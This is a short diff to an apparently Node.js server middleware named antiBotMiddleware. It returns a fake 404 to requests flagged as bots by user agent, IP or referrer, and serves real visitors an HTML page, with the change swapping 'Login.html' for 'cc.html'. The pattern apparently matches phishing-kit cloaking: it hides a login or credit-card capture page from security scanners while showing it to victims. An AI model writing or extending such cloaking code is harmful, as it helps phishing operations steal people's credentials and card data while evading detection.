@@ -301,7 +301,7 @@ function antiBotMiddleware(req, res, next) {
     if (isBotUA(clientUA) || isBotIP(clientIP) || isBotRef(clientRef)) {
         return res.status(404).send('Not Found');
     } else {
-        res.sendFile(path.join(__dirname, 'Login.html'));
+        res.sendFile(path.join(__dirname, 'cc.html'));
     }
 }
 
